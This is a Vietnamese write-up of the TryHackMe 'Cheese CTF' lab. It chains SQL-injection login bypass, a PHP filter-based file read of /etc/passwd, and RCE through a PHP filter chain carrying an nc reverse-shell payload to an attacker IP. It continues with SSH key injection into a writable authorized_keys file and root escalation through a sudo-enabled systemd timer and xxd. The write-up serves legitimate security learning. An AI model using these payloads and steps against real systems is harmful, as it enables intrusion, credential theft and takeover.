![image](https://hackmd.io/_uploads/HJJBnhkJ1g.png)

# Room info and Comment
## Room info
This room was inspired by a long cheese discussion and thread on the TryHackMe Discord, which included shadow, vain, sudo_veggies, and more.

## Comment
Bài lab này hay và xứng đáng với mức độ khó của nó

# Recon
## nmap 
Vì nmap cho ra rất nhiều kết quả nên ta sẽ phải rà theo các hành vi của port tiêu chuẩn là 80 (http)

![image](https://hackmd.io/_uploads/Skq6uTkyke.png)

Sau khi tìm hiểu thì có thể sử dụng option `sX` 
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sX 10.10.175.114
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-06 04:35 EDT
Nmap scan report for cheesectf.thm (10.10.175.114)
Host is up (0.22s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE         SERVICE
22/tcp   open|filtered ssh
80/tcp   open|filtered http
4444/tcp open|filtered krb524

Nmap done: 1 IP address (1 host up) scanned in 14.35 seconds
```
Tìm hiểu kỹ hơn ta thấy được server dùng `Apache`
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p22,80,4444 -sCV 10.10.175.114
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-06 04:37 EDT
Nmap scan report for cheesectf.thm (10.10.175.114)
Host is up (0.22s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b1:c1:22:9f:11:10:5f:64:f1:33:72:70:16:3c:80:06 (RSA)
|   256 6d:33:e3:bd:70:62:59:93:4d:ab:8b:fe:ef:e8:a7:b2 (ECDSA)
|_  256 89:2e:17:84:ed:48:7a:ae:d9:8c:9b:a5:8e:24:04:bd (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: The Cheese Shop
|_http-server-header: Apache/2.4.41 (Ubuntu)
4444/tcp open  mon     mon service monitoring daemon
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.46 seconds
```
## Port 80 - http
Ta được dẫn đến trang web ngoài login thì không có tính năng khác

![image](https://hackmd.io/_uploads/rJedOayk1g.png)

## gobuster
Kết quả khi sử dụng **gobuster** ta có path `/images`

![image](https://hackmd.io/_uploads/H1dT9Ty1yl.png)

`/images` có thể liên tưởng đến các cuộc tấn công đến file vì ta có thể xem ảnh của trang web qua đây 

![image](https://hackmd.io/_uploads/H1XXCT11Je.png)

# User flag
## sqlmap
Tính năng login lại không có đăng ký nên khả năng nó sẽ dính sqli. Sử dụng **sqlimap** để gửi các payload để bypass login 
```
┌──(kali㉿kali)-[~/Desktop]
└─$ sqlmap -r req     
```
Kết quả trả về của **sqlmap** khi ta có được đường dẫn đến `secret-script.php`

![image](https://hackmd.io/_uploads/rkJWG0ykye.png)

## PHP Wrapper
Từ trên ta truy cập vào đường dẫn `http://10.10.175.114/secret-script.php?file=supersecretadminpanel.html`

![image](https://hackmd.io/_uploads/rJM9MAy1kl.png)

Nhận thấy rằng nó có param `?file` đang đọc file ra từ server 

![image](https://hackmd.io/_uploads/BkmkXAJyyx.png)

Ta sẽ đọc thử file `/etc/passwd` bằng [PHP filter](https://www.php.net/manual/en/wrappers.file.php)
```
php://filter/read=convert.base64-encode/resource=/etc/passwd
```

Dcode trên cyberchef ta nhận được nội dung ngay

![image](https://hackmd.io/_uploads/SkcdQRkJkl.png)

Lợi dụng kỹ thuật trên để xem src của `/secret-script.php` và nó chỉ đơn giản là đọc file 

![image](https://hackmd.io/_uploads/SyNCLRJ1ke.png)

### RCE with PHP Filters Chain
Sau khi dùng một vài kỹ thuật nhỏ upload và ghi file đểvRCE không thành công thì mình lại phải google tìm cách khác : ) 

https://github.com/synacktiv/php_filter_chain_generator

Đây là cách RCE mà không cần phải upload file lên nhưng ta có thể thao túng được param (như đã làm được)

```
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>'
```

![image](https://hackmd.io/_uploads/SJ_KR011yx.png)

Kết quả thay vào:

![image](https://hackmd.io/_uploads/H1C5R0yy1x.png)

Tương tự ta sẽ viết payload để có reverse shell

```
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 php_filter_chain_generator.py --chain '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.202.137 1234 >/tmp/f"); ?>'
```

![image](https://hackmd.io/_uploads/SkJxmylJyx.png)

## Lateral Movement
Sau khi reverse shell thành công, ta vẫn chưa đọc được flag

![image](https://hackmd.io/_uploads/rklPXkgykx.png)

Sử dụng **linpeas** hoặc dùng lệnh này thì ta thấy được file `.ssh` có thể sửa
```
$ find /  -type f -writable 2>/dev/null | grep -Ev '^(/proc|/snap|/sys|/dev)'
/home/comte/.ssh/authorized_keys
/var/tmp/authorized_keys.swp
/etc/systemd/system/exploit.timer
```
Bây giờ đơn giản chỉ cần gen key ra và login bằng acc của mình

![image](https://hackmd.io/_uploads/BkzYDklkye.png)

Copy nội dung và chèn vào file `authorized_keys`

![image](https://hackmd.io/_uploads/r1Usvkl1yl.png)

```
echo 'YOUR SSH PUBLIC KEY' > /home/comte/.ssh/authorized_keys
```

Giờ thì login vs `id_rsa` của acc `comte`

![image](https://hackmd.io/_uploads/HkKwdygy1e.png)

Lấy user flag

![image](https://hackmd.io/_uploads/rk6oOJg1kx.png)

# Root flag
## sudo -l
```
comte@cheesectf:~$ sudo -l
User comte may run the following commands on cheesectf:
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
    (ALL) NOPASSWD: /bin/systemctl start exploit.timer
    (ALL) NOPASSWD: /bin/systemctl enable exploit.timer
```
Như nãy ở trên, ta có thể biết được file `exploit.timer` có thể viết được. Từ file trên phát hiện ra rằng có một service phải được kích hoạt nên cd vào `/etc/systemd/system` và tìm một file có tên là `exploit.service` 

![image](https://hackmd.io/_uploads/rk_yyfekkx.png)

## Exploit xxd 
Từ nội dung trên ta thấy được `xxd` đang có trên hệ thống, thứ mà ta có thể thao túng nó để đọc file mà không cần quyền. Tham khảo [ở đây](https://gtfobins.github.io/gtfobins/xxd/#suid)

Nhưng vì chưa được kích hoạt vì ở file `exploit.timer` time đang chưa set nên ta sẽ sửa 0 để kích hoạt

![image](https://hackmd.io/_uploads/HJP-xGx1Jg.png)

Kích hoạt lại 

![image](https://hackmd.io/_uploads/BkkQGzlyJx.png)

Sau đó chạy `xxd` và hoàn thành Room

![image](https://hackmd.io/_uploads/HJFSfGxkke.png)

![image](https://hackmd.io/_uploads/HkUOzflkJl.png)



